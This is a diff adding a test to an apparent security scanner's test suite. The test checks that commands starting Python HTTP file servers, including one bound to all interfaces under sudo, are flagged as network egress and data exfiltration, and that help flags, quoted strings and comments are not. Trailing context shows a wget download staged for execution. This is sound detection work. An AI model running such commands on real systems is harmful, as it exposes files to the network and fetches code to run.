@@ -82,6 +82,44 @@ describe("scan", () => {
     )).toBe(false);
   });
 
+  it("detects Python HTTP file servers as network exposure and data exfiltration", () => {
+    const servers = [
+      "python3 -m http.server",
+      "python -m http.server 8080",
+      "python3 -m http.server --directory /tmp/share 19090",
+      "sudo python3 -m http.server 8000 --bind 0.0.0.0",
+    ];
+    for (const source of servers) {
+      expect(scan(source).findings).toEqual(expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "network.python-http-server",
+          category: "network_egress",
+        }),
+        expect.objectContaining({
+          ruleId: "exfil.python-http-server",
+          category: "data_exfiltration",
+        }),
+      ]));
+    }
+
+    const hardNegatives = [
+      "python3 -m http.server --help",
+      "python3 -m http.server -h",
+      "python3 -m http.client",
+      "python3 -m compileall /tmp/project",
+      "python3 /tmp/http_server.py",
+      "runner='python3 -m http.server 8000'",
+      "echo 'python3 -m http.server 8000'",
+      "# python3 -m http.server 8000",
+    ];
+    for (const source of hardNegatives) {
+      expect(scan(source).findings.some((finding) =>
+        finding.ruleId === "network.python-http-server"
+        || finding.ruleId === "exfil.python-http-server"
+      )).toBe(false);
+    }
+  });
+
   it("detects staged archive execution", () => {
     const result = scan(`
       wget https://example.test/tool.tar.gz -O /tmp/tool.tar.gz
